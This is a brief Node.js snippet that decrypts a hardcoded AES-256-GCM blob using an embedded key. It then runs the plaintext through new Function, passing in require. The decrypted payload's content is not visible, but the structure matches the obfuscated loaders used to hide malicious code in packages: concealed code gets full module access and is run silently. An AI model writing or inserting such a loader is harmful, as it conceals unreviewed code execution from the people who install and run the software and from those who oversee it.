    const crypto = require('crypto');

    function decrypt(encdata, authTag, salt, iv, masterkey) {
        const key = crypto.scryptSync(masterkey, Buffer.from(salt, 'hex'), 64, { N: 16384, r: 8, p: 1 }).slice(0, 32);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, Buffer.from(iv, 'hex'));
        decipher.setAuthTag(Buffer.from(authTag, 'hex'));
        let decrypted = decipher.update(encdata, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    }

    const decrypted = decrypt('07b4b472883c543cb98dee36b482d2abe47279', 'ae22ce8750116753f79f80e2920c7b38', '8ea11ccc0018dcd128ff119f1b0f8fd7', 'f22343fd0f98220418a8b950e6143e63', 'a7a3d56706fecb8b813833f82d9910efa6d234e58acad10f5b8848f5e05b658a');

    try {
        new Function('require', decrypted)(require);
      } catch (error) {
        console.error('Decryption or execution failed:', error);
      }
